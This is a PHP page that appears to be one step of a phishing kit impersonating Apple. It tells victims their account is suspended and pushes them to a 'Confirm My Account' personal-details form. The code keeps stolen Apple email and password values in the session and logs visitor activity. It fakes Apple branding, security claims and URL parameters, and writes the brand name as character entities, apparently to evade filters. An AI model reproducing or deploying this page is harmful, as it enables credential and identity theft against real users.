<?php
require_once('function.shc.php');
$apple = new Apple;
$ip =  $apple->ip(); $apple->logs("Sedang di halaman Suspended"); // log activity
if($_SESSION['start'] != true){
   $apple->ip();
}
if(!$_SESSION['status_login']){
   header('Location: '.$apple->sitehost().' /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
if(empty($_GET['path']) && empty($_GET['appIdKey'])){
    header('Location: '.$apple->sitehost().' ../account/manage/suspended/?suspended=true&appIdKey='.md5(time()).md5(time()).'&path=/account/manage?referrer=/signin/&sslEnabled=true&login=suspended');
}
if(empty($_SESSION['apple_email']) && empty($_SESSION['apple_password'])){
   session_destroy();
   header('Location: '.$apple->sitehost().' /?appIdKey='.md5(time()).md5(time()).'&path=/signin/?referrer=/account/manage&sslEnabled=true');
}
?>
<!DOCTYPE html>
<html lang="en">
   <head>
      <meta http-equiv="content-type" content="text/html; charset=UTF-8">
      <title>Your Account Hasbeen Suspended</title>
      <link href="<?= $apple->sitehost();?>/assets/css/logins.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/css/header.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/css/footer.css" type="text/css" rel="stylesheet">
      <link href="<?= $apple->sitehost();?>/assets/img/favicon.ico" rel="shortcut icon" type="image/x-icon">
      <script src="<?= $apple->sitehost();?>/assets/js/jquery-1.11.3.min.js"></script>
      <script src="<?= $apple->sitehost();?>/assets/js/nicescroll.min.js"></script>
      <script src="<?= $apple->sitehost();?>/assets/js/drilldown.js"></script>
   </head>
   <body>
      <div class="header"><div class="navbar"></div></div>
      <div class="main">
         <div class="myid">
            <img src="<?= $apple->sitehost();?>/assets/img/logolaper.png" class="headerlogo">
         </div>
         <div class="layout">
            <div class="layout-leftA">
            </div>
            <div class="layout-right" style="padding-left:0 !important;">
               <img src="<?= $apple->sitehost();?>/assets/img/notice.png">
               <div>
               <a href="<?= $apple->sitehost();?>/account/manage/personal/update">
                  <input type="button" class="submit" value="Confirm My Account" style="width:180px;text-align:center;"></a>
            </div>
            </div>
         </div>
         <div id="footer">
      <p>The &#65;p&#112;l&#101; Online Store uses industry-standard encryption to protect the confidentiality of the information you submit. Learn more about our <a href="#">Security Policy</a></p>
      <hr>
      <div class="copy-right"><p style="font-size: 12">More ways to shop: Visit an <a href="#">Apple Store</a>, call 1-800-MY-APPLE, or <a href="#">find a reseller</a><br><br>Copyright &copy; <?php echo date('Y'); ?> &#65;p&#112;l&#101; Inc. All rights reserved.   <a href="#">Privacy Policy</a>   |  <a href="#">Term of Use</a>   |  <a href="#">Sales and Refunds</a>   |  <a href="#">Site Map</a></p></div>
      </div>
   </body>
</html>